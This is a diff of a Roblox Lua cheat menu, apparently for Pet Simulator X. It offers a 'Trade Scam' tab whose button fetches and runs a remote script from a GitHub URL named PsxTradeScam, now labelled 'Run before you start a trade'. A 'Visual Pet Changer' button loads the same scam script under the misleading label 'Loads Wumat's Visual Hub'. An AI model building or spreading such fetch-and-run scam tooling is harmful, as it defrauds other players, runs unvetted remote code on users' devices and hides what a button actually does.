@@ -54,10 +54,10 @@ end)
 
 --fourth
 local TradeScam = Window:NewTab("Trade Scam (OP)")
-local TradeScamSection = TradeScam:NewSection("Trade Scam (click when your in a trade)")
+local TradeScamSection = TradeScam:NewSection("Trade Scam")
 
 
-TradeScamSection:NewButton("Trade Scam", "Loads Up Private Trade Scam Script", function()
+TradeScamSection:NewButton("Trade Scam", "Run before you start a trade", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
 end)
 
@@ -112,6 +112,6 @@ local VisualPetChanger = Window:NewTab("Visual Pet Changer")
 local VisualPetChangerSection = VisualPetChanger:NewSection("Visual Pet Changer")
 
 
-VisualPetChangerSection:NewButton("Visual Pet Changer", "Changes Your Pet", function()
+VisualPetChangerSection:NewButton("Visual Pet Changer", "Loads Wumat's Visual Hub", function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
 end)
